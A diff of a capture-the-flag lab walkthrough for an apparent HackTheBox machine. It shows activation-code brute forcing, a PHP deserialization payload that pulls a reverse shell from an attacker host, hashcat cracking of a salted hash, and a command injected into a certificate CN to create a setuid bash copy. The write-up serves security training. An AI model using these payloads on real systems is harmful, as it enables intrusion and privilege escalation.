@@ -141,7 +141,7 @@ View other contents of the PHP files. When viewing the contents of utils.php, we
 
 The code above generates a random activation code. Lets download the code and modify a little bit so that it generates multiple activation code. We then need to brute force it on /activation/ path discovered through above directory busting.
 
-```
+```php
 <?php
     $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
     for ($k = 0; $k < 5000; $k++)
@@ -179,7 +179,7 @@ I figured out that the class **AvatarInterface** has two variables **tmp** and *
 
 Lets create a payload which generates a serialized data. About an attack scenario, we will be download a [PHP reverse shell code](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and save it on a TXT format. We will host a code on an attacker machine. The serialized code will open the TXT file hosted and writes into is root directory as PHP file. The payload is
 
-```
+```php
 <?php
 class Avatar {
     public $imgPath;
@@ -238,7 +238,7 @@ It is a 32 Bit characters, might be MD5. Tried using hashcat to find a plaintext
 
 Viewing the content of db\_connect.php again, we can find the db\_salt which is “Nacl”. Add a salt in hash. We can find a bill password.
 
-```
+```bash
 echo "13edad4932da9dbb57d9cd15b66ed104:NaCl" > hash.txt
 hashcat -a 0 -m 20 hash.txt rockyou.txt
 ```
@@ -249,7 +249,7 @@ User Flag
 
 SSH into a box using bill credentials.
 
-```
+```bash
 ssh bill@10.10.11.195
 # Enter a cracked password
 ```
@@ -265,16 +265,15 @@ Run [Pspy](https://github.com/DominicBreuker/pspy).
 
 Viewing the process owned by root. We can see that the script /opt/renew\_cert.sh runs in every 10 seconds and it takes /home/bill/Certs/broscience.crt as an argument.
 
-```
+```bash
 ./pspy64 -i 100
 ```
-
 
 Viewing the contents of the file, it checks whether provided certificate file is expired or not. And if expired, it executes an openssl command to create a outdated certificate file.
 
 We first need to create a certificate which has 1 day expiration and replace it with previous broscience.crt file.
 
-```
+```bash
 openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /home/bill/Certs/broscience.key -out /home/bill/Certs/broscience.crt -days 1
 # In CN, inject with a command which copies the /bin/bash to /tmp/bash and assign it SGID
 test; $(cp /usr/bin/bash /tmp/bash; chmod +s /tmp/bash)
